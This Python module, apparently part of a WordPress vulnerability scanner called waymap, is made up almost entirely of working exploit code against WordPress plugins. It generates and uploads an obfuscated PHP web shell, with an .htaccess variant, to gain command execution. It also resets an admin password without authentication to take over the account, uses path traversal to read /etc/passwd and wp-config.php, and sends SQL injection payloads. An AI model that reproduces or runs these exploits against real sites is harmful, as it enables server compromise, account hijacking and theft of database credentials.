# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# wp.py profile high
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random
from colorama import Fore, Style, init
from termcolor import colored
import json
init(autoreset=True)
import time
import hashlib
import io
import zipfile
import string
import base64
from platform import python_version
#---------------------------------------------------------------------




def generate_zip_25094(compression_level=9, technique="php", keep=True):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Generating ZIP file with shell technique '{technique}'")

    buffer = io.BytesIO()
    
    if python_version() >= '3.7.0':
        zip_file = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False, compression_level)
    else:
        zip_file = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False)

    if technique == "php":
        shell = "<?php "
        shell += "$f = \"lmeyst\";"
        shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
        shell += "@$words = array(base64_decode($_POST['text']));"
        shell += "$j=\"array\".\"_\".\"filter\";"
        shell += "@$filtered_words = $j($words, $a);"
        if not keep:
            shell += "@unlink(__FILE__);"
        shell_filename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".php"
        zip_file.writestr(shell_filename, shell)

    elif technique.startswith("htaccess"):
        shell = "AddType application/x-httpd-php .png\n"
        zip_file.writestr(".htaccess", shell)                 

        shell = "<?php "
        shell += "$f = \"lmeyst\";"
        shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
        shell += "@$words = array(base64_decode($_POST['text']));"
        shell += "$j=\"array\".\"_\".\"filter\";"
        shell += "@$filtered_words = $j($words, $a);"
        if not keep:
            shell += "@unlink('.'+'h'+'t'+'a'+'cc'+'e'+'ss');"
            shell += "@unlink(__FILE__);"
        shell_filename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".png"
        zip_file.writestr(shell_filename, shell)

    else:
        print(f"{Style.BRIGHT}{Fore.RED}[!] Error: Unknown shell technique '{technique}'")
        return None, None, None  

    zipname = ''.join(random.choice(string.ascii_lowercase) for i in range(3))            
    return buffer, zipname, shell_filename


def upload_zip_25094(profile_url, zip_file, zipname):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Uploading ZIP archive to {profile_url}/wp-admin/admin-ajax.php?action=add_custom_font")
    url = f"{profile_url}/wp-admin/admin-ajax.php?action=add_custom_font"
    files = {"file": (f"{zipname}.zip", zip_file.getvalue())}
    
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Origin": profile_url,
        "Referer": profile_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9"
    }
    
    r = requests.post(url, data={"action": "add_custom_font"}, files=files, headers=headers, verify=False)

    if r.status_code != 200 or not r.text.startswith('{"status":"success"'):
        print(f"{Style.BRIGHT}{Fore.RED}[!] Upload failed! HTTP {r.status_code} - {r.text}")
        return False
    
    print(f"{Style.BRIGHT}{Fore.GREEN}[+] Upload successful!")
    return True


def trigger_shell_25094(profile_url, zipname, shell_filename, cmd):
    shell_url = f"{profile_url}/wp-content/uploads/typehub/custom/{zipname}/{shell_filename}"
    encoded_cmd = base64.b64encode(cmd.encode("utf8")).decode("utf8")
    
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Triggering shell at {shell_url}")
    try:
        r = requests.post(url=shell_url, data={"text": encoded_cmd}, verify=False)
        if r.status_code != 200:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Shell trigger failed! HTTP {r.status_code} - {r.text}")
            return False
        
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] Shell triggered successfully!")
        print(r.text)
        return True

    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] Error during shell triggering: {e}")
        return False


def scan_cve_2021_25094(profile_url):
    cmd = 'id'
    techniques = ["php", "htaccess"] 

    for technique in techniques:
        print(f"{Style.BRIGHT}{Fore.CYAN}[•] Attempting exploitation using technique: {technique}")
        zip_file, zipname, shell_filename = generate_zip_25094(technique=technique, keep=True)

        if zip_file is None or zipname is None or shell_filename is None:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Exploitation failed due to ZIP generation error with technique: {technique}")
            continue 

        if upload_zip_25094(profile_url, zip_file, zipname):
            if trigger_shell_25094(profile_url, zipname, shell_filename, cmd):
                print(f"{Style.BRIGHT}{Fore.GREEN}[+] Exploitation successful using technique: {technique}")
                return True 
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Exploitation failed using technique: {technique}")

    return False  

#---------------------------------------------------------------------


#---------------------------------------------------------------------

data = {'wpie_download_export_id': '1'}

def check_vulnerability_0236(profile_url):
    try:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for CVE-2022-0236 vulnerability...")

        response = requests.post(f'{profile_url}/wp-admin/admin.php?page=wpie-new-export', data=data, verify=False)

        if response.status_code == 200:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] {profile_url} is vulnerable to CVE-2022-0236: unauthenticated sensitive data disclosure.")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[-] {profile_url} is not vulnerable to CVE-2022-0236.")
            return False

    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] An error occurred: {e}")
        return False

def scan_cve_2022_0236(profile_url):
    check_vulnerability_0236(profile_url)

#---------------------------------------------------------------------


#---------------------------------------------------------------------


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}

def exploit_armember(profile_url, timeout=5):
    """
    Exploit function for ARMember plugin vulnerability (CVE-2022-1903).
    Attempts to exploit an unauthenticated admin account takeover in WordPress.
    """
    session = requests.Session()

    try:
        print(colored(f'[•] Fetching user information from: {profile_url}wp-json/wp/v2/users/', 'yellow'))
        response = session.get(url=profile_url + 'wp-json/wp/v2/users/', headers=headers, allow_redirects=True, verify=False, timeout=timeout)

        if response.status_code != 200:
            print(colored(f'[-] Failed to fetch user data. Status code: {response.status_code}', 'red'))
            return  

        user_data = json.loads(response.text)
        if not user_data:
            print(colored(f'[-] No user data found at {profile_url}', 'red'))
            return False
        
        user_slug = user_data[0]['slug']
        print(colored(f'[•] User found: {user_slug}', 'green'))

        payload = {
            'action': 'arm_shortcode_form_ajax_action',
            'user_pass': 'biulove0x',
            'repeat_pass': 'biulove0x',
            'arm_action': 'change-password',
            'key2': 'x',
            'action2': 'rp',
            'login2': user_slug
        }

        print(colored(f'[•] Attempting password reset for user: {user_slug}', 'yellow'))
        exploit_response = session.post(url=profile_url + 'wp-admin/admin-ajax.php', headers=headers, data=payload, allow_redirects=True, verify=False, timeout=timeout)

        if exploit_response.status_code == 200:
            print(colored(f'[•] Password reset payload delivered successfully!', 'green'))

            login_data = {
                'log': user_slug,
                'pwd': 'biulove0x',
                'wp-submit': 'Login',
                'redirect_to': profile_url + 'wp-admin/',
                'testcookie': 1
            }
            login_response = session.post(url=profile_url + 'wp-login.php', data=login_data, cookies=cookies, allow_redirects=True, verify=False)

            if 'wp-admin/profile.php' in login_response.text:
                print(colored(f'[+] Exploit successful! Logged in as {user_slug}', 'green', attrs=['bold']))
                return True
            else:
                print(colored(f'[-] Exploit failed: Unable to login as {user_slug}', 'red', attrs=['bold']))
                return False
        else:
            print(colored(f'[-] Exploit failed: Payload was not accepted. Status code: {exploit_response.status_code}', 'red'))
            return False

    except Exception as e:
        print(colored(f'[!] Error during exploitation: {e}', 'red'))
        return False

#---------------------------------------------------------------------

#---------------------------------------------------------------------


class Color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'

color_random = [
    Color.HEADER, Color.IMPORTANT, Color.NOTICE, 
    Color.OKBLUE, Color.OKGREEN, Color.WARNING, 
    Color.RED, Color.END, Color.UNDERLINE, 
    Color.LOGGING
]    

def fetch_contents_35749(profile_url):
    fetch_path = "/etc/passwd" 
    username = "admin"         
    password = "admin"         

    print(color_random[5] + "[+] Trying to fetch the contents from " + fetch_path)
    time.sleep(3)

    login_url = profile_url + "wp-login.php"
    wp_path = profile_url + 'wp-admin/post.php?post=application_id&action=edit&sjb_file=' + fetch_path

    try:
        with requests.Session() as session:
            headers = {
                'Cookie': 'wordpress_test_cookie=WP Cookie check',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15'
            }

            post_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': wp_path,
                'testcookie': '1'
            }

            print(color_random[2] + "[+] Logging in to: " + login_url)
            login_response = session.post(login_url, headers=headers, data=post_data, verify=False)

            if login_response.status_code != 200 or 'dashboard' not in login_response.text:
                print(color_random[6] + "[-] Login failed. Exiting.")
                return 

            response = session.get(wp_path, headers=headers, verify=False)

            if response.status_code == 200:
                print(color_random[4] + response.text)

                with open("output.txt", "w") as out_file:
                    out_file.write(response.text)
                print(color_random[5] + "\n[+] Output saved as: output.txt\n")
                return True
            else:
                print(color_random[6] + f"[-] Failed to fetch contents. Status code: {response.status_code}")
                return False

    except Exception as e:
        print(color_random[6] + f"[!] Error: {e}")
        return 

def scan_cve_2020_35749(profile_url):
    fetch_contents_35749(profile_url)

#---------------------------------------------------------------------

#---------------------------------------------------------------------


def check_wp_config_accessibility_1119(profile_url):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking for the accessibility of 'wp-config.php' through the vulnerable plugin endpoint...")
    payload = "/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=../../../wp-config.php"
    
    try:
        response = requests.get(f'{profile_url}{payload}', 
                                headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        if response.status_code == 200 and "DB_NAME" in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable! 'wp-config.php' is accessible through the plugin.")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] 'wp-config.php' is not accessible. The Target may not be vulnerable.")
            return False
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error accessing 'wp-config.php': {e}")
        return False

def scan_cve_2022_1119(profile_url):
    if check_wp_config_accessibility_1119(profile_url):
        print(f"{Style.BRIGHT}{Fore.GREEN}[•] Target is vulnerable to CVE-2022-1119!")
        return True
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Target does not seem to be vulnerable to CVE-2022-1119.")
        return

#---------------------------------------------------------------------

#---------------------------------------------------------------------


def check_admin_ajax_availability_21661(profile_url):
    print("[•] Checking for the availability of 'admin-ajax.php' endpoint...")
    try:
        response = requests.get(f'{profile_url}/wp-admin/admin-ajax.php', 
                                headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        if response.status_code == 400 and '0' in response.text:
            print("[•] 'admin-ajax.php' endpoint is available and responding as expected.")
            return True
        else:
            print("[•] 'admin-ajax.php' is either not accessible or not responding as expected.")
            return False
    except Exception as e:
        print(f"[•] Error accessing 'admin-ajax.php': {e}")
        return False

def test_md5_injection_21661(profile_url):
    """
    Attempt to exploit using MD5 hash-based SQL injection.
    """
    print("[•] Attempting MD5 hash-based SQL injection...")
    rand_num = str(random.randint(1234567890987654321, 9999999999999999999)).encode('utf-8')
    data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(' + str(rand_num) + '),0x5e))#"]}}}'
    
    try:
        response = requests.post(f'{profile_url}/wp-admin/admin-ajax.php', 
                                 data={"action":"test", "data":data},
                                 headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        
        if response.status_code == 200 and hashlib.md5(rand_num).hexdigest() in response.text:
            print("[•] Vulnerable to SQL injection! (MD5 hash matched)")
            return True
        else:
            print("[•] MD5 hash injection failed. Proceeding to test time-based injection...")
            return False
    except Exception as e:
        print(f"[•] Error during MD5 hash injection: {e}")
        return False

def test_time_based_injection_21661(profile_url):
    """
    Attempt to exploit using time-based SQL injection.
    """
    print("[•] Attempting time-based SQL injection...")
    data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(5))#"]}}}'
    
    try:
        response = requests.post(f'{profile_url}/wp-admin/admin-ajax.php', 
                                 data={"action":"test", "data":data},
                                 headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        
        if response.elapsed.total_seconds() >= 5 and response.status_code == 200:
            print("[•] Vulnerable to SQL injection! (Time-based delay detected)")
            return True
        else:
            print("[•] Time-based injection failed. Target does not appear vulnerable.")
            return False
    except Exception as e:
        print(f"[•] Error during time-based injection: {e}")
        return False

def scan_cve_2022_21661(profile_url):
    if not check_admin_ajax_availability_21661(profile_url):
        print("[•] Skipping further tests due to inaccessible admin-ajax.php")
        return "admin-ajax.php not accessible"
    if test_md5_injection_21661(profile_url):
        return "Target is vulnerable to MD5-based SQL injection"
    if test_time_based_injection_21661(profile_url):
        return "Target is vulnerable to time-based SQL injection"
    return "No SQL injection vulnerability detected"

#---------------------------------------------------------------------

#---------------------------------------------------------------------

COMMAND_43408 = '1'  

def authenticate_43408(session, profile_url, username, password):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting authentication for {profile_url}...")

    auth_url = f'{profile_url}/wp-login.php'
    
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    body = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    try:
        auth = session.post(auth_url, headers=header, data=body, verify=False)
        if "wp-admin" in auth.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] Authentication successful!")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[-] Authentication failed.")
            return False
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] Error during authentication: {e}")
        return False

def perform_exploit_43408(session, profile_url, command):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Performing exploit on {profile_url}...")

    exploit_url = f'{profile_url}/wp-admin/admin-ajax.php'

    header = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': '*/*',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': profile_url
    }

    body = {
        "action": "cdp_action_handling",
        "token": "cdp",
        "f": "copy_post",
        "origin": "tooltip",
        "id[]": command,
        "data[type]": "copy-quick",
        "data[times]": "1",
        "data[site]": "-1",
        "data[profile]": "default",
        "data[swap]": "false"
    }

    try:
        response = session.post(exploit_url, headers=header, data=body, verify=False)
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] Exploit response: \n{response.text}")
        return True
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] Error during exploit: {e}")
        return False

def scan_cve_2022_43408(profile_url):
    session = requests.Session()
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting exploit")

    username = input("Enter username: ")
    password = input("Enter password: ")

    if authenticate_43408(session, profile_url, username, password):
        perform_exploit_43408(session, profile_url, COMMAND_43408)

#---------------------------------------------------------------------

def handle_cve_2022_21661(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2022-21661 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2022_21661(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2022-21661 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Scan interrupted for {Fore.YELLOW}CVE-2022-21661{Style.RESET_ALL}. Skipping to the next CVE...")
        return  

def handle_cve_2022_1903(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2022-1903 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        exploit_armember(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2022-1903 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Scan interrupted for {Fore.YELLOW}CVE-2022-1903{Style.RESET_ALL}. Skipping to the next CVE...")
        return

def handle_cve_2022_1119(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2022-1119 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2022_1119(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2022-1119 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Scan interrupted for {Fore.YELLOW}CVE-2022-1119{Style.RESET_ALL}. Skipping to the next CVE...")
        return

def handle_cve_2022_0236(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2022-0236 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2022_0236(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2022-0236 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Scan interrupted for {Fore.YELLOW}CVE-2022-0236{Style.RESET_ALL}. Skipping to the next CVE...")
        return

def handle_cve_2022_43408(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2022-43408 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2022_43408(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2022-43408 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Scan interrupted for {Fore.YELLOW}CVE-2022-43408{Style.RESET_ALL}. Skipping to the next CVE...")
        return

def handle_cve_2021_25049(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2021-25094 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2021_25094(profile_url)
        print(f"{Fore.CYAN}[+] Completed scan for {Fore.YELLOW}CVE-2021-25094 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Scan interrupted for {Fore.YELLOW}CVE-2021-25094{Style.RESET_ALL}. Skipping to the next CVE...")
        return

def handle_cve_2020_35749(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2020-35749 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2020_35749(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2020-35749 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Scan interrupted for {Fore.YELLOW}CVE-2020-35749{Style.RESET_ALL}. Skipping to the next CVE...")
        return
